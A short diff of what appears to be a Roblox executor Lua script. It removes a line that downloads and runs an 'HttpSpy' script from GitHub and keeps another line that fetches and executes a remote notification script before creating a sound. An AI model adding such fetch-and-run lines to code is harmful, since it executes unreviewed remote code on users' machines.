@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://github.com/385j8888/ZOUMAGUIX/blob/main/FQ!HttpSpy!.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E9%A1%B6%E9%83%A8%E9%80%9A%E7%9F%A5.lua"))()
 local sound = Instance.new("Sound")
 sound.SoundId = "rbxassetid://4590662766"
